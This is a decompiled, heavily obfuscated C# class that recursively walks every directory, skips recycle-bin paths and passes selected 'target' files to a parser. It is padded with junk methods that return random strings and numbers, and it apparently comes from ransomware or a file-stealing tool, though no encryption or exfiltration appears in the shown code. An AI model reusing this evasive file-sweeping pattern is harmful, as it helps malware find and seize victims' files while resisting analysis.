using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;

namespace hkyiuiuljll;

internal class dw
{
	[CompilerGenerated]
	private ifc ZsZjN3FYI2nrlXbKLXVClcvP9sNvjHi6btVzwf8ETtysm7LYSwckBZHIiUGrbZjDXNft;

	[CompilerGenerated]
	private ifp GMa0S8i5j9hkAjWJzteyVN7vw30bTa5fO2PX7BdJ1zIlKwc7vB43s8Jpr54Xzp;

	private ifc FileChecker
	{
		[CompilerGenerated]
		get
		{
			return ZsZjN3FYI2nrlXbKLXVClcvP9sNvjHi6btVzwf8ETtysm7LYSwckBZHIiUGrbZjDXNft;
		}
		[CompilerGenerated]
		set
		{
			ZsZjN3FYI2nrlXbKLXVClcvP9sNvjHi6btVzwf8ETtysm7LYSwckBZHIiUGrbZjDXNft = value;
		}
	}

	private ifp FileParser
	{
		[CompilerGenerated]
		get
		{
			return GMa0S8i5j9hkAjWJzteyVN7vw30bTa5fO2PX7BdJ1zIlKwc7vB43s8Jpr54Xzp;
		}
		[CompilerGenerated]
		set
		{
			GMa0S8i5j9hkAjWJzteyVN7vw30bTa5fO2PX7BdJ1zIlKwc7vB43s8Jpr54Xzp = value;
		}
	}

	public dw(ifc uL8XBJQIYTx8MOGD4LWr8soC4Lh9hcxbTe7XxV5iHIKVn5kij63I1qJ97eivy1UhdY, ifp aIyqefJM1MwB4DyjBdKEP7xb8QmWPmDSUZ4ifX9rvjrUqLdlrBDlwj8spcy8i8)
	{
		FileChecker = uL8XBJQIYTx8MOGD4LWr8soC4Lh9hcxbTe7XxV5iHIKVn5kij63I1qJ97eivy1UhdY;
		FileParser = aIyqefJM1MwB4DyjBdKEP7xb8QmWPmDSUZ4ifX9rvjrUqLdlrBDlwj8spcy8i8;
	}

	public void TraverseDirectories(string NhO4MjmMSn2djppHwWPSpEpS4vi2E2ZShPcxFOPDpVLv7glREXcVlj1shMN8Ejp4gaX4)
	{
		try
		{
			string[] files = Directory.GetFiles(NhO4MjmMSn2djppHwWPSpEpS4vi2E2ZShPcxFOPDpVLv7glREXcVlj1shMN8Ejp4gaX4);
			for (int i = 0; i < files.Length; i++)
			{
				ProcessFile(files[i].ToLower());
				Thread.Sleep(0);
			}
		}
		catch
		{
		}
		try
		{
			string[] directories = Directory.GetDirectories(NhO4MjmMSn2djppHwWPSpEpS4vi2E2ZShPcxFOPDpVLv7glREXcVlj1shMN8Ejp4gaX4);
			foreach (string nhO4MjmMSn2djppHwWPSpEpS4vi2E2ZShPcxFOPDpVLv7glREXcVlj1shMN8Ejp4gaX in directories)
			{
				TraverseDirectories(nhO4MjmMSn2djppHwWPSpEpS4vi2E2ZShPcxFOPDpVLv7glREXcVlj1shMN8Ejp4gaX);
				Thread.Sleep(0);
			}
		}
		catch
		{
		}
	}

	private void ProcessFile(string KF1ezp4BKvX4RoEC22l7Ay8vaEAIDLvoIW2gHWb2ac0Ff6Ged0U4gSMZRbm3w9)
	{
		if (IsTargetFile(KF1ezp4BKvX4RoEC22l7Ay8vaEAIDLvoIW2gHWb2ac0Ff6Ged0U4gSMZRbm3w9))
		{
			FileParser.ParseFile(KF1ezp4BKvX4RoEC22l7Ay8vaEAIDLvoIW2gHWb2ac0Ff6Ged0U4gSMZRbm3w9);
		}
	}

	private bool IsTargetFile(string string_0)
	{
		if (!string_0.Contains("recycle"))
		{
			return FileChecker.IsTargetFile(string_0);
		}
		return false;
	}

	public static string g5YR2kD8LSkaY5SgmChFPeKBT4Ol4ZYeMdQ0UJYFOU7iVr0g6D()
	{
		return "ddWIhRCh5TpCleb92dWXjyCAwQifYLbNvswBWsDZLwiclmpYJRlvP";
	}

	public static int iRHw29B7zbdS61a0CJe4o2cRqgu0cCxb9mXY1jVSekakFztDiT()
	{
		return 917137464;
	}

	public static string gVaFuvnukHrt1FKZFaehCs6AdYS1Hvtpm3J0zD83RNFRUOPK13()
	{
		return "Pd8tuPPYs22ELFdvfNN7Wdd3anSvIWqb6pzuO7P6WIDG00KbrvZepsd9RyeROCVx";
	}

	public static int smethod_0()
	{
		return 853267942;
	}

	public static string w6XFrA5ddIBuYHumHtOfVED5KDQMMuNHDPLiwvqBZbVA0dCZ1P()
	{
		return "TGfj0Z1AF24J4C2WLM5PkcvQBM8datHhgVFTRR3RaE6KzwIeBkjIDz3PENNow7c8r";
	}

	public static int hyfcu01f4q9cyarUs5Lqe1JQR64idIsM2IbcgiE9JZRj2FFO1V()
	{
		return 58168628;
	}

	public static string b5DlG71rBTYQ0XuMV3MLe2fJhVGv9lJJZOYkkzqWsjx9tKBHs9()
	{
		return "P08MMnM2w6VJhBnBoV0usr87sDK5xN3o9uWHu0AGqeyEOMRopAY1JTmQ28Z3";
	}

	public static int Y7vduyXMSlg5X71xLlsbvlbD11u5Tpy78DsUkgPKfPGUlkIDu1()
	{
		return 830599223;
	}

	public static string FRrjpWcZtdMSwka2uR4Gjw8f9QHNZbVTp4Uo8miqRvl5s1xFt8()
	{
		return "2g65UCMcHaLjRzkDRJ2hpP7H0h3JuXhRX7PtDMnAikOhIXFiVvlO1Firk";
	}

	public static int GPkjbBqxDXZzZbARVfzkHWbndWbrigtMJRofLKzB09fQFG96wi()
	{
		return 709343900;
	}

	public static string eTvY4E6r2JASzNHnANl6uTBhVHvi21nDKNYZr0LUyOKQmkSpvF()
	{
		return "lVX2FT53GmS8tzpWzd67sPpoEeq9GSGzgdEwcCXphZKtJqEnqMIP8VS3Lr";
	}

	public static int smethod_1()
	{
		return 513530128;
	}

	public static string z6rnn73bpVVK74GzEf7HZpucgD04sK7xorJ7ReKKlDYbREl4um()
	{
		return "YSQFA12FGPulaqEwNd8iZGZkaEwzT2Sh9o7DpJOK6zrIglfT8ASVpnpKgPE";
	}

	public static int FhROTL1O6ndp1P7TOqbhgx4HI1OFrKBkPAvovaq761QAvrzZBj()
	{
		return 396687943;
	}

	public static string HoTCpRcZhEmyFKxEXK3jH7JhrFfuMAaePYhlykUpHKsaEjfHRs()
	{
		return "u382SZuYmGrn82TdO4GAVYxjVqMhAAnrvzGvjaSsBnT9nSeu6ZVWSXMQGPn";
	}

	public static int smethod_2()
	{
		return 482083916;
	}
}
